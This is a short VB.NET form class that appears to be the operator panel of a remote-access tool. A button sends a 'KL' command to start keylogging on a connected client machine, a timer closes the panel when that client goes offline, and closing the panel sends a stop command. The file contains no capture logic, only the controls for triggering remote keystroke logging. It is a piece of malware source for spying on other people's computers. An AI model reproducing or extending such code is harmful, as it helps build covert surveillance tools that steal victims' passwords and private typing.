Imports System.ComponentModel

Public Class Keylogger
    Public M As Main
    Public U As Integer

    Private Sub MetroButton1_Click(sender As Object, e As EventArgs) 
        M.S.Send(U, "KL")
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If Not M.S.Online.Contains(U) Then
            Me.Close()
        End If
    End Sub

    Private Sub Keylogger_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        M.S.Send(U, "Close")
    End Sub
End Class